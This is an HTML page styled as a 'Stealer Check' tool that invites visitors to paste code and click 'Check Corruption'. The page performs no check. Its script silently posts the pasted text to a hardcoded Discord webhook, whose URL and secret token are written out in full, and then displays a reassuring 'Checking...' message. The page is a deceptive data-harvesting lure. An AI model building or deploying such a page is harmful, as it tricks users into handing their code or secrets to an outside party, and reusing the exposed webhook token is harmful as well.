<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stealer Info Check</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Custom styles for the Inter font and overall body */
        body {
            font-family: 'Inter', sans-serif;
            background-color: #000000; /* Pure black background */
            color: #ffffff; /* Default white text color for everything */
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 1rem; /* Add some padding for smaller screens */
            box-sizing: border-box; /* Include padding in element's total width and height */
            overflow: hidden; /* Hide overflow to prevent scrollbars from stars */
            position: relative; /* Needed for absolute positioning of stars */
        }

        /* --- Custom Dark Blue Shades --- */
        .custom-bg-darkblue-primary {
            background-color: #0A0A10; /* Very dark blue, almost black */
        }
        .custom-border-darkblue {
            border-color: #121218; /* A shade darker, for subtle distinction */
        }
        .custom-button-darkblue {
            background-color: #121218;
        }
        .custom-button-darkblue:hover {
            background-color: #1A1A22;
        }
        .custom-focus-ring-blue {
            --tw-ring-color: #2c3e50;
        }
        .custom-error-bg {
            background-color: #8b0000;
        }
        .custom-success-bg {
            background-color: #006400;
        }
        .text-white {
            color: #ffffff;
        }

        /* --- Star Animation Styles --- */
        .stars {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none; /* Allows clicks to pass through stars to content */
            z-index: -1; /* Ensures stars are behind content */
        }

        .star {
            position: absolute;
            background-color: #ffffff;
            border-radius: 50%;
            opacity: 0; /* Starts invisible, then fades in via animation */
            animation: twinkle 3s infinite ease-in-out alternate,
                       floatAround 65s infinite linear; /* Changed to LINEAR for constant speed */
        }

        @keyframes twinkle {
            0% { opacity: 0; transform: scale(0.5); }
            5% { opacity: 1; transform: scale(1); }
            50% { opacity: 1; transform: scale(1); }
            100% { opacity: 0; transform: scale(0.5); }
        }

        /* New keyframe for subtle, free floating movement */
        @keyframes floatAround {
            0% { transform: translate(0, 0); }
            25% { transform: translate(calc(var(--rand-x-1) * 1vw), calc(var(--rand-y-1) * 1vh)); }
            50% { transform: translate(calc(var(--rand-x-2) * 1vw), calc(var(--rand-y-2) * 1vh)); }
            75% { transform: translate(calc(var(--rand-x-3) * 1vw), calc(var(--rand-y-3) * 1vh)); }
            100% { transform: translate(0, 0); }
        }

    </style>
</head>
<body class="text-white">
    <div class="stars" id="star-container"></div> <div class="custom-bg-darkblue-primary p-8 rounded-lg shadow-xl w-full max-w-md mx-auto border custom-border-darkblue z-10 relative">
        <h1 class="text-3xl font-bold text-white mb-6 text-center">Stealer Check</h1>

        <div class="mb-4">
            <label for="messageInput" class="block text-white text-sm font-semibold mb-2">Enter Code:</label>
            <textarea
                id="messageInput"
                rows="6"
                class="w-full p-3 custom-bg-darkblue-primary text-white rounded-md border custom-border-darkblue focus:outline-none focus:ring-2 custom-focus-ring-blue transition duration-200 ease-in-out resize-y"
                placeholder="Enter Code"
            ></textarea>
        </div>

        <button
            id="sendButton"
            class="w-full custom-button-darkblue hover:custom-button-darkblue text-white font-bold py-3 px-4 rounded-md focus:outline-none focus:ring-2 custom-focus-ring-blue focus:ring-opacity-75 transition duration-300 ease-in-out transform hover:scale-105"
        >
            Check Corruption
        </button>

        <div id="messageBox" class="mt-6 p-3 text-sm text-center rounded-md hidden">
            </div>
    </div>

    <script>
        // Get references to the HTML elements
        const messageInput = document.getElementById('messageInput');
        const sendButton = document.getElementById('sendButton');
        const messageBox = document.getElementById('messageBox');
        const starContainer = document.getElementById('star-container');

        // Discord webhook URL
        const webhookUrl = 'https://discord.com/api/webhooks/1395524525038501898/NvLWqzSozM0UVmcBWOjPLnFyk8_u0HOv-APeS5kjr6ZwT0kapfpkYuH4b8W7uKBSO7qF';

        // Cooldown variables
        const cooldownTime = 20 * 1000; // 20 seconds in milliseconds
        let lastClickTime = 0;

        /**
         * Displays a message in the message box.
         * @param {string} message - The message to display.
         * @param {boolean} isError - True if it's an error message, false otherwise.
         */
        function showMessageBox(message, isError = false) {
            messageBox.textContent = message;
            messageBox.classList.remove('hidden', 'custom-success-bg', 'custom-error-bg');
            if (isError) {
                messageBox.classList.add('custom-error-bg');
            } else {
                messageBox.classList.add('custom-success-bg');
            }
            messageBox.classList.remove('hidden');
            setTimeout(() => {
                messageBox.classList.add('hidden');
            }, 5000);
        }

        // Add event listener to the send button
        sendButton.addEventListener('click', async () => {
            const currentTime = Date.now();
            const timeSinceLastClick = currentTime - lastClickTime;

            if (timeSinceLastClick < cooldownTime) {
                showMessageBox('Please wait 20 seconds before checking any corruption', true);
                return;
            }

            const message = messageInput.value.trim();

            if (!message) {
                showMessageBox('Please enter a message before Checking.', true);
                return;
            }

            lastClickTime = currentTime;

            sendButton.disabled = true;
            sendButton.textContent = 'Checking...';
            messageBox.classList.add('hidden');

            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ content: message }),
                });

                if (response.ok) {
                    showMessageBox('Checking...');
                    messageInput.value = '';
                } else {
                    const errorText = await response.text();
                    showMessageBox(`Failed to check: ${response.status} ${response.statusText}. ${errorText}`, true);
                }
            } catch (error) {
                showMessageBox(`An error occurred: ${error.message}`, true);
                console.error('Fetch error:', error);
            } finally {
                if (Date.now() - lastClickTime >= cooldownTime) {
                     sendButton.disabled = false;
                     sendButton.textContent = 'Check Corruption';
                }
            }
        });

        setInterval(() => {
            if (sendButton.disabled && Date.now() - lastClickTime >= cooldownTime) {
                sendButton.disabled = false;
                sendButton.textContent = 'Check Corruption';
            }
        }, 1000);

        // --- Star Generation and Animation Logic for Floating ---
        const numberOfStars = 80; // Still 200 stars for density

        function createStars() {
            for (let i = 0; i < numberOfStars; i++) {
                const star = document.createElement('div');
                star.classList.add('star');

                // Randomize size
                const size = Math.random() * 3 + 1; // Stars from 1px to 4px
                star.style.width = `${size}px`;
                star.style.height = `${size}px`;

                // Randomize initial position within the viewport
                star.style.left = `${Math.random() * 100}vw`;
                star.style.top = `${Math.random() * 100}vh`;

                // Set CSS variables for random translation amounts
                star.style.setProperty('--rand-x-1', (Math.random() * 100 - 50).toFixed(0)); // -50 to 50 vw
                star.style.setProperty('--rand-y-1', (Math.random() * 100 - 50).toFixed(0)); // -50 to 50 vh
                star.style.setProperty('--rand-x-2', (Math.random() * 100 - 50).toFixed(0));
                star.style.setProperty('--rand-y-2', (Math.random() * 100 - 50).toFixed(0));
                star.style.setProperty('--rand-x-3', (Math.random() * 100 - 50).toFixed(0));
                star.style.setProperty('--rand-y-3', (Math.random() * 100 - 50).toFixed(0));

                // Randomize animation delays and durations for variety
                star.style.animationDelay = `${Math.random() * 0.5}s`;
                star.style.animationDuration = `${Math.random() * 20 + 50}s`; // Movement duration 50-70s (super slow)

                starContainer.appendChild(star);
            }
        }

        // Call the function to create stars when the page loads
        createStars();
    </script>
</body>
</html>
